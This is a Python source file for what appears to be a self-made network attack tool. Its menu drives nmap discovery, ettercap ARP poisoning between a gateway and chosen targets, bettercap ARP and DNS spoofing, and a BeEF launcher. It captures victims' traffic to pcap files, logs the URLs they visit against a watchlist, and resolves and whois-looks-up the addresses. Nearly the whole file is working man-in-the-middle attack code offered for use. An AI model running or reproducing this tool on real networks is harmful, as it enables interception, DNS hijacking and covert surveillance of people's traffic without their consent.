import sys
import asyncio
import os
import re
import subprocess
import tempfile
import aiofiles
from datetime import datetime
from scapy.layers.http import HTTPRequest
from colorama import Fore
import signal
import pyfiglet
from termcolor import colored
import random
import time
from scapy.all import rdpcap, IP
from collections import defaultdict
import socket as std_socket
import webbrowser
from scapy.all import rdpcap
import dns.resolver
from colorama import Fore, Style
from dns.exception import DNSException

def create_ascii_text():
    # create a list of fonts
    font_list = pyfiglet.FigletFont.getFonts()

    # create a list of colors
    color_list = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

    # Set default text
    default_text = "Keep Threats Outside"

    # Clear the terminal screen
    os.system("clear")
    # Choose a random font and color
    font_choice = random.choice(font_list)
    color_choice = random.choice(color_list)

    # Generate ASCII art using the random font
    ASCII_art_1 = pyfiglet.figlet_format(default_text, font=font_choice)

    # Print the ASCII art in the chosen color
    print(colored(f"Font: {font_choice}\n", color_choice))
    print(colored(ASCII_art_1, color_choice))
    copy_right=colored("author cyb2rS2c",'red')
    print(copy_right)
# call function
create_ascii_text()



async def get_user_input():
    # Assuming the user data is gathered here, and we will return it as a dictionary
    user_data = {}

    # Collect the active network interface
    user_data['interface'] = input("Enter your active interface e.g. wlan0: ").strip()

    # The path to the URL file and the filter file
    user_data['url_file_path'] = 'url_file.txt'
    user_data['filter_file'] = 'excluded_ips.ef'

    # List of IPs to exclude
    user_data['exclude_ips'] = ["192.168.1.1", "192.168.1.2", "192.168.1.5", "192.168.1.125", "192.168.1.253"]

    # Collect the target IP(s) for scanning, convert input string to a list
    target_ips_input = input("Enter the target IPs (comma separated): ").strip()

    # If input is not empty, split by comma and remove spaces to create the list
    if target_ips_input:
        user_data['target_ips'] = [ip.strip() for ip in target_ips_input.split(',')]
    else:
        # Default target IP if no input is provided
        user_data['target_ips'] = ["192.168.1.1"]

    return user_data



# Get default gateway and IP address for the given interface
async def get_network_info(interface):
    try:
        # Get default gateway
        process = await asyncio.create_subprocess_exec('ip', 'route', stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        route_output = stdout.decode()

        # Extract default gateway
        gateway_match = re.search(r'default via (\S+)', route_output)
        default_gateway = gateway_match.group(1) if gateway_match else "Not found"

        # Get IP address for the interface
        process = await asyncio.create_subprocess_exec('ip', 'addr', 'show', interface, stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        ip_output = stdout.decode()

        # Extract IP address
        ip_match = re.search(r'inet (\S+)', ip_output)
        ip_address = ip_match.group(1) if ip_match else "Not found"

        return default_gateway, ip_address
    except Exception as e:
        print(Fore.RED + f"An error occurred while fetching network info: {e}")
        return None, None

async def run_nmap_scan(target):
    try:
        process = await asyncio.create_subprocess_exec(
            'nmap', '-T4', '--max-scan-delay', '100s', '-sn', target,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            result = stdout.decode()
            print(Fore.GREEN + "Nmap scan results:")
            print(result)
            active_ips = re.findall(r'Nmap scan report for (\S+)', result)
            return active_ips
        else:
            print(Fore.RED + "Nmap command failed with return code", process.returncode)
            print(Fore.RED + "Error message:", stderr.decode())
            return []

    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")
        return []



async def compile_filter_file(filter_file, interface):
    if not os.path.isfile(filter_file):
        print(Fore.RED + f"Error: The input file '{filter_file}' does not exist.")
        return None

    compiled_file = filter_file.replace('.ef', '.efc')
    compile_command = ['sudo', 'etterfilter', filter_file, '-o', compiled_file]

    # Optional: Log the interface if you want to use it for debugging or tracking
    print(f"Compiling filter file using interface: {interface}")

    try:
        print(f"Compiling filter file with command: {' '.join(compile_command)}")
        compile_process = await asyncio.create_subprocess_exec(
            *compile_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await compile_process.communicate()

        # Log the output
        print(stdout.decode().strip())
        if compile_process.returncode != 0:
            error_message = stderr.decode().strip()
            print(Fore.RED + f"Error compiling the Ettercap filter file: {error_message}")
            return None
        else:
            print(Fore.GREEN + f"Filter file compiled successfully into: {compiled_file}.")
            return compiled_file
    except Exception as e:
        print(Fore.RED + f"An error occurred while compiling the filter file: {e}")
        return None




async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path):
    # Compile the filter file and ensure it's compiled correctly
    compiled_file = await compile_filter_file(filter_file, interface)  # Pass interface to the compile step
    if not compiled_file:
        print(Fore.RED + "Failed to compile the filter file. Aborting Ettercap run.")
        return

    # Read URLs from the provided file
    urls_to_match = read_urls_from_file(url_file_path)

    # Ensure target_ips is a list, even if a single IP is provided
    if isinstance(target_ips, str):
        target_ips = [target_ips]

    # Iterate over each target IP sequentially
    for target_ip in target_ips:
        # Define the PCAP file name for each target IP
        pcap_file = f"{target_ip}_filtered_activity.pcap"

        # Construct the Ettercap command
        ettercap_command = [
            'sudo', 'ettercap', '-T', '-S', '-i', interface, '-F', compiled_file,
            '-M', 'arp:remote', f'//{default_gateway}/', f'//{target_ip}/',
            '-w', pcap_file  # Save the filtered packets to the PCAP file
        ]

        try:
            # Run the Ettercap command
            print(f"Running Ettercap with command: {' '.join(ettercap_command)}")
            print('Wait for packets to appear in Wireshark...')
            print('Attacking ...')

            # Running Ettercap in a new GNOME terminal window
            gnome_ettercap_command = f'gnome-terminal -- bash -c "sudo ettercap -T -S -i {interface} -F {compiled_file} -M arp:remote //{default_gateway}/ //{target_ip}/ -w {pcap_file}; exec bash"'
            os.system(gnome_ettercap_command)  # Launch Ettercap in GNOME terminal

            ettercap_process = await asyncio.create_subprocess_exec(
                *ettercap_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await ettercap_process.communicate()

            # Check for errors in the process
            if ettercap_process.returncode != 0:
                print(Fore.RED + f"Ettercap encountered an error for target: {target_ip}. Error: {stderr.decode().strip()}")
            else:
                print(Fore.GREEN + f"Ettercap completed successfully for target: {target_ip}.")

                # Process the saved PCAP file (filtered)
                await process_ip(target_ip, pcap_file, url_file_path)

                # Log matched URLs if any are found
                matched_urls = [url for url in urls_to_match if url in stdout.decode()]
                if matched_urls:
                    with open(f"{target_ip}.txt", "a") as f:
                        for matched_url in matched_urls:
                            f.write(f"{matched_url} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    print(Fore.GREEN + f"Matched URLs for {target_ip} have been logged to {target_ip}.txt")

            # Open Wireshark in a new GNOME terminal window with filter applied
            gnome_wireshark_command = f'gnome-terminal -- bash -c "wireshark -i {interface} -k -Y \\"ip.addr=={target_ip}\\"; exec bash"'
            os.system(gnome_wireshark_command)  # Launch Wireshark in GNOME terminal

        except asyncio.CancelledError:
            # Handle process cancellation
            print(Fore.YELLOW + f"Ettercap process was cancelled for target: {target_ip}")
            ettercap_process.terminate()
            await ettercap_process.wait()
            await menu()  # Display the menu again after cancellation

        except Exception as e:
            # Handle any unexpected errors
            print(Fore.RED + f"An error occurred while running Ettercap for target {target_ip}: {e}")
            await menu()  # Display the menu again after an error


async def extract_urls_from_pcap(pcap_file):
    urls = set()
    try:
        packets = rdpcap(pcap_file)
        for packet in packets:
            if HTTPRequest in packet and packet.haslayer("Raw"):
                raw_load = packet[HTTPRequest].load.decode(errors='ignore')
                urls.update(re.findall(r'http://[^\s"]+', raw_load))
                urls.update(re.findall(r'https://[^\s"]+', raw_load))
    except Exception as e:
        print(Fore.RED + f"Error processing pcap file: {e}")
    return urls

async def save_successful_urls(target_ip, successful_urls):
    successful_urls_file_path = f"{target_ip}_successful_urls.txt"

    try:
        async with aiofiles.open(successful_urls_file_path, mode='w') as file:
            for url in successful_urls:
                await file.write(f"{url}\n")
        print(Fore.GREEN + f"Successful URLs for {target_ip} saved to {successful_urls_file_path}.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while saving successful URLs for {target_ip}: {e}")

async def process_ip(ip_address, pcap_file, url_file_path):
    print(Fore.YELLOW + f"Processing PCAP file for IP: {ip_address}")
    urls = await extract_urls_from_pcap(pcap_file)
    if urls:
        print(Fore.GREEN + f"Extracted URLs for IP {ip_address}:")
        matching_urls = compare_urls(urls, url_file_path)
        if matching_urls:
            await save_successful_urls(ip_address, matching_urls)
        else:
            print(Fore.RED + f"No matching URLs found for IP {ip_address}.")
    else:
        print(Fore.RED + f"No URLs found for IP {ip_address}.")

def compare_urls(extracted_urls, url_file_path):
    file_urls = load_urls_from_file(url_file_path)
    return [url for url in extracted_urls if url in file_urls]

def load_urls_from_file(file_path):
    if not os.path.isfile(file_path):
        print(Fore.RED + f"URL file {file_path} not found.")
        return []

    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def read_urls_from_file(file_path):
    urls = []
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        print(Fore.GREEN + f"Successfully read URLs from {file_path}.")
    except FileNotFoundError:
        print(Fore.RED + f"Error: The file '{file_path}' was not found.")
    except IOError as e:
        print(Fore.RED + f"Error reading file '{file_path}': {e}")
    
    return urls


def create_excluded_ips_file(filter_file, exclude_ips):
    try:
        with open(filter_file, 'w') as f:
            for ip in exclude_ips:
                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
                f.write(f"    drop();\n")
                f.write(f"}}\n")
        print(Fore.GREEN + f"Created filter file '{filter_file}' with excluded IPs.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while creating the filter file: {e}")


def handle_sigterm(signum, frame):
    print(Fore.YELLOW + "Received termination signal. Cleaning up...")
    # Implement any necessary cleanup here
    exit(0)



async def run_wireshark(interface, target_ips, urls, exclude_ips):
    # Ensure target_ips is a list
    if isinstance(target_ips, str):
        target_ips = [target_ips]
    
    # Normalize URLs by stripping protocol and handling variations in domain/subdomain
    with open(urls, 'r') as url_file:
        normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]

    # Create exclusion filter for IPs
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
    
    # Create IP filter for target IPs
    target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])

    # Create URL filters - search for full URLs or domains in frames
    url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])

    # Combine IP filters and URL filters
    filter_parts = []
    if exclude_filter:
        filter_parts.append(f"({exclude_filter})")
    if target_ip_filter:
        filter_parts.append(f"({target_ip_filter})")
    if url_filters:
        filter_parts.append(f"({url_filters})")

    filter_str = " && ".join(filter_parts) if filter_parts else "ip"

    # Print the combined filter for debugging
    print(Fore.CYAN + f"Running Wireshark with combined filter: {filter_str}")

    # Command to run Wireshark with the filter
    command = [
        'sudo', 'wireshark', '-i', interface, '-k', '-Y', filter_str
    ]

    try:
        # Run Wireshark with the combined filter
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if process.returncode != 0:
            print(Fore.RED + f"Wireshark encountered an error: {stderr.decode().strip()}")
        else:
            print(Fore.GREEN + "Wireshark completed.")
            await menu()
                
        
    except Exception as e:
        print(Fore.RED + f"An error occurred while running Wireshark: {e}")




#resolve
def resolve_ip_to_hostname(ip):
    """
    Resolve an IP address to a hostname.

    Args:
        ip (str): The IP address to resolve.

    Returns:
        str: The resolved hostname or 'N/A' if resolution fails.
    """
    try:
        hostname, _, _ = std_socket.gethostbyaddr(ip)
        return hostname
    except std_socket.herror:
        return 'N/A'



# Simple in-memory cache
cache = {}

# Asynchronous function to resolve a single IP address
async def resolve_hostname(ip):
    if ip in cache:
        return cache[ip]

    # Run DNS resolution in the executor
    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(None, lambda: dns.resolver.resolve_address(ip)[0].target.to_text())
        cache[ip] = result
        return result
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, DNSException):
        cache[ip] = "No PTR record"
        return "No PTR record"
    except Exception as e:
        cache[ip] = f"Resolution error: {e}"
        return f"Resolution error: {e}"

# Asynchronous function to process the pcap file
async def resolve_pcap_file(pcap_file, output_file_path):
    resolved_data = {}
    
    try:
        packets = rdpcap(pcap_file)
        tasks = []

        # Collect all IP addresses from the pcap file
        ip_addresses = set()
        for packet in packets:
            if packet.haslayer('IP'):
                ip_addresses.add(packet['IP'].src)
                ip_addresses.add(packet['IP'].dst)

        # Create tasks for resolving all IP addresses
        for ip in ip_addresses:
            tasks.append(resolve_hostname(ip))

        # Await all DNS resolution tasks
        hostnames = await asyncio.gather(*tasks)

        # Map IP addresses to their hostnames
        hostname_map = dict(zip(ip_addresses, hostnames))

        # Create the resolved data dictionary
        for packet in packets:
            if packet.haslayer('IP'):
                src_ip = packet['IP'].src
                dst_ip = packet['IP'].dst
                
                resolved_data[packet.summary()] = {
                    'src_ip': src_ip,
                    'src_hostname': hostname_map.get(src_ip, "Unknown"),
                    'dst_ip': dst_ip,
                    'dst_hostname': hostname_map.get(dst_ip, "Unknown")
                }

    except Exception as e:
        print(f"Error resolving pcap file: {e}")
    
    return resolved_data


async def get_ip_addresses_from_pcap(pcap_file: str) -> set:
    """Extract unique IP addresses from a pcap file."""
    ip_addresses = set()
    packets = rdpcap(pcap_file)
    for packet in packets:
        if packet.haslayer('IP'):
            ip_addresses.add(packet['IP'].src)
            ip_addresses.add(packet['IP'].dst)
    return ip_addresses
async def whois_lookup(ip: str) -> dict:
    """Perform a WHOIS lookup using the Kali Linux `whois` command-line tool."""
    try:
        result = await asyncio.to_thread(subprocess.run, ['whois', ip], capture_output=True, text=True, check=True)
        output = result.stdout

        # Parse the WHOIS output
        whois_info = {}
        
        # Regex patterns for common fields
        patterns = {
            'Org Type': r'org-type:\s*(.*)',
            'Address': r'address:\s*(.*)',
            'Netname': r'netname:\s*(.*)',
            'NetRange': r'netrange:\s*(.*)',
            'Country': r'country:\s*(.*)',
            'Abuse Contact': r'abuse-mailbox:\s*(.*)',
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                whois_info[key] = match.group(1).strip()

        # Fill in IP address and default messages for missing data
        whois_info['IP'] = ip
        for key in patterns.keys():
            if key not in whois_info:
                whois_info[key] = 'N/A'

        return whois_info

    except subprocess.CalledProcessError as e:
        return {'IP': ip, 'Error': str(e)}
    


async def run_command(command, shell=False):
    """Run a shell command asynchronously and return output and errors."""
    try:
        print(f"Executing command: {command}")  # Debug: Print the command being run
        process = await asyncio.create_subprocess_shell(
            command,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        print(f"Command output: {stdout.decode()}")
        if process.returncode != 0:
            print(f"Command failed with error: {stderr.decode()}")
        
        return stdout.decode(), stderr.decode()
    except Exception as e:
        print(f"Exception occurred: {e}")
        return "", str(e)

async def start_apache():
    """Start the Apache2 service."""
    command = 'sudo service apache2 start'
    await run_command(command, shell=True)

async def stop_apache():
    """Stop the Apache2 service."""
    command = 'sudo service apache2 stop'
    await run_command(command, shell=True)

async def start_beef():
    """Start BeEF."""
    command = 'sudo beef-xss'
    await run_command(command, shell=True)

def open_web_browser():
    """Open localhost in the web browser."""
    webbrowser.open('http://localhost')

async def run_bettercap():
    iptospoof = input("Enter IP to spoof (e.g., 192.168.0.121): ")
    domaintoforward = "unused.com"

    # Prepare the Bettercap commands with delays
    commands = [
        "net.probe on",
        "net.show",
        "set arp.spoof.targets {}".format(iptospoof),
        "net.sniff on",
        "net.sniff off",
        "clear",
        "set dns.spoof.domains {}".format(domaintoforward),
        "dns.spoof on"
    ]
    
    # Open GNOME Terminal and run Bettercap commands
    terminal_command = [
        'gnome-terminal', 
        '--', 
        'bash', '-c', 
        f"echo 'Starting Bettercap...'; sudo bettercap -X -I wlan0; "  # Replace 'wlan0' with your interface
        f"{' && '.join(commands)}; exec bash"
    ]
    
    try:
        # Run the terminal command
        process = subprocess.Popen(terminal_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Optionally, read and print the terminal's stdout and stderr
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(f"Error in running Bettercap: {stderr.decode()}")
        else:
            print("Bettercap running successfully in GNOME Terminal.")
    
    except Exception as e:
        print(f"Error running Bettercap in GNOME Terminal: {e}")




async def apply_filter_and_save(pcap_file, output_file, filter_str):
    command = [
        'tshark',  # Use tshark for filtering
        '-r', pcap_file,      # Input pcap file
        '-Y', filter_str,     # Display filter
        '-w', output_file     # Output pcap file to save filtered results
    ]
    
    try:
        # Run the tshark command
        process = await asyncio.create_subprocess_exec(*command)
        await process.wait()  # Wait for the process to complete
        print(Fore.GREEN + f"Filtered pcap file saved as {output_file}.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
async def filter_and_analyze_pcap(user_data):
    # Set up signal handler for termination
    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGTERM, handle_sigterm)

    # Extract user data from the parameter
    interface = user_data['interface']
    url_file_path = user_data['url_file_path']
    filter_file = user_data['filter_file']
    exclude_ips = user_data['exclude_ips']
    target_ips = user_data['target_ips']

    try:
        # Assume this function gets network information (gateway and IP address)
        default_gateway, ip_address = await get_network_info(interface)
    except Exception as e:
        print(Fore.RED + f"Error getting network info: {e}")
        return

    target_network = f"{default_gateway}/24"
    
    try:
        # Run nmap scan to identify active devices
        isactive = await run_nmap_scan(target_network)
    except Exception as e:
        print(Fore.RED + f"Error running Nmap scan: {e}")
        return

    print(f"Excluded IPs: {exclude_ips}")
    reinclude_choice = input("Enter the IP you want to reinclude (choose from the list above) or press Enter to skip: ")
    
    if reinclude_choice:
        if reinclude_choice in exclude_ips:
            print(f"Removing {reinclude_choice} from the excluded list.")
            exclude_ips.remove(reinclude_choice)
        else:
            print("The host is already included in the Nmap scan; no IP was removed from the excluded list.")
    
    if target_ips[0] not in isactive:
        print(f"{target_ips[0]} is not active after the Nmap scan")
        
        if input("Do you want to add another device to the target_ips list? (yes/no or press Enter to skip): ").lower() == "yes":
            to_scan = input("Enter the host IP to add to the scan: ")
            if input(f"Do you want to remove all the old targets {target_ips} from the target_ips list? (remove/keep or press Enter to skip): ").lower() == "remove":
                target_ips.clear()
                target_ips.append(to_scan)
                print(f"Removed old targets and added new: {target_ips}")
            else:
                target_ips.append(to_scan)
                print(f"Added new target, keeping existing targets: {target_ips}")

    # Prepare filenames for pcap files
    pcap_file = f'{"_".join(target_ips)}_filtered_activity.pcap'
    output_file = f'{"_".join(target_ips)}_filtered_output.pcap'

    # Create excluded IPs filter file
    create_excluded_ips_file(filter_file, exclude_ips)

    # Compile the filter file
    compiled_file = await compile_filter_file(filter_file, interface)
    if not compiled_file:
        print(Fore.RED + "Compilation failed.")
        return
    print(f"Compiled file is located at: {compiled_file}")

    # Create filter string
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
    target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])

    with open(url_file_path, 'r') as url_file:
        normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]
    url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])

    filter_str = " && ".join(filter(None, [
        exclude_filter,
        target_ip_filter,
        url_filters
    ]))

    print(Fore.CYAN + f"Applying filter to pcap file: {filter_str}")

    # Initialize tasks as None to ensure they are defined even if exceptions are raised
    ettercap_task = None
    wireshark_task = None

    # Run Ettercap and Wireshark in parallel
    try:
        ettercap_task = asyncio.create_task(run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path))
        wireshark_task = asyncio.create_task(run_wireshark(
            interface=interface,
            target_ips=target_ips,
            urls=url_file_path,
            exclude_ips=exclude_ips
        ))

        # Wait for both Ettercap and Wireshark to finish
        await asyncio.gather(ettercap_task, wireshark_task)

    except Exception as e:
        print(Fore.RED + f"An error occurred while running Ettercap and Wireshark: {e}")
        # Cancel tasks if any exception occurs
        if ettercap_task and not ettercap_task.done():
            ettercap_task.cancel()
        if wireshark_task and not wireshark_task.done():
            wireshark_task.cancel()
        await asyncio.gather(
            *(task for task in [ettercap_task, wireshark_task] if task and not task.done()),
            return_exceptions=True
        )

    # Proceed with filtering and analyzing the pcap file
    try:
        filter_task = asyncio.create_task(apply_filter_and_save(pcap_file, output_file, filter_str))
        await filter_task
    except Exception as e:
        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")

    print(Fore.GREEN + "Both filtering and Wireshark analysis completed.")




def has_packets(pcap_file):
    """ Check if the PCAP file contains any packets. """
    try:
        packets = rdpcap(pcap_file)
        return len(packets) > 0
    except Exception as e:
        print(Fore.RED + f"Error reading PCAP file: {e}")
        return False
async def resolve_and_display_ips(user_data):
    # Extract target_ips from user_data
    target_ips = user_data.get("target_ips", ["192.168.1.121"])  # Default if not set in user_data

    # Resolve pcap file names and display results
    pcap_file = f'{"_".join(target_ips)}_filtered_activity.pcap'
    output_file_path = f'{"_".join(target_ips)}_resolved_output.txt'

    # Resolve pcap file names and display results
    resolved_info = await resolve_pcap_file(pcap_file, output_file_path)
    for packet_summary, data in resolved_info.items():
        print(f"Packet: {packet_summary}")
        print(f"Source IP: {data['src_ip']} -> Source Hostname: {data['src_hostname']}")
        print(f"Destination IP: {data['dst_ip']} -> Destination Hostname: {data['dst_hostname']}\n")

    # Extract and deduplicate IPs for WHOIS lookup
    ip_addresses = await get_ip_addresses_from_pcap(pcap_file)
    unique_ips = list(set(ip_addresses))  # Remove duplicates

    # Perform WHOIS lookups
    whois_tasks = [whois_lookup(ip) for ip in unique_ips]
    whois_results = await asyncio.gather(*whois_tasks)

    # Display WHOIS results
    for result in whois_results:
        print(f"WHOIS information for IP: {result['IP']}")
        if 'Error' in result:
            print(f"Error: {result['Error']}")
        else:
            print(f"Org Type: {result.get('Org Type', 'N/A')}")
            print(f"Address: {result.get('Address', 'N/A')}")
            print(f"Netname: {result.get('Netname', 'N/A')}")
            print(f"NetRange: {result.get('NetRange', 'N/A')}")
            print(f"Country: {result.get('Country', 'N/A')}")
            print(f"Abuse Contact: {result.get('Abuse Contact', 'N/A')}\n")

async def menu():
    user_data = {}  # Store user inputs to prevent re-asking

    while True:
        print("\nMenu:")
        print("1. Sniffer: Filter and Analyze Pcap")
        print("2. Resolve and Display IPs")
        print("3. Spoofer: Bettercap ('MITM attack')")
        print("4. Aggressive sniffer + MITM")
        print("5. Exit")

        choice = input("Enter your choice: ")

        if choice in {'1', '2', '4'}:
            # Ensure we collect user data only once
            if not user_data:
                user_data = await get_user_input()

        if choice == '1':
            await filter_and_analyze_pcap(user_data)  # Use stored data
        elif choice == '2':
            await resolve_and_display_ips(user_data)  # Use stored data
        elif choice == '3':
            await run_bettercap()  # No need for user input storage here
        elif choice == '4':
            await asyncio.gather(
                filter_and_analyze_pcap(user_data),
                run_bettercap()
            )
        elif choice == '5':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice. Please enter a number between 1 and 5.")
async def main():
    await menu()

if __name__ == "__main__":
    asyncio.run(main())
